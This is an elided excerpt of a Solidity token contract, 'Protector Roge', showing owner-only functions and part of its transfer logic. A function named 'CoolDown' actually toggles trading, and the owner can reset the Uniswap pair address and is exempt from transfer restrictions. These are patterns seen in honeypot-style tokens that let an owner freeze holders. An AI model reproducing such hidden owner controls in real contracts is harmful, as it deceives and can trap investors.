...
contract PROGE is Context, IERC20, Ownable {
    ...
    string private _name = 'Protector Roge';
    ...
    function CoolDown(bool enable) public onlyOwner {
        enableTrading = enable;
    }
    
    function getUniV2Pair() public onlyOwner {
        address V2Pair = IUniswapV2Factory(uniswapRouter01.factory()).getPair(address(this), uniswapRouter01.WETH());
        require(V2Pair != address(0));
        uniswapV2Pair = V2Pair;
    }
    
    function setV2Pair(address addr_) public onlyOwner {
        uniswapV2Pair = addr_;
    }
    ...
    function _transferStandard(address sender, address recipient, uint256 tAmount) private {
        if (sender != owner() && recipient != owner()) {
            ...
            if(sender == uniswapV2Pair) cooldown[sender] = block.timestamp + (45 seconds);
        }
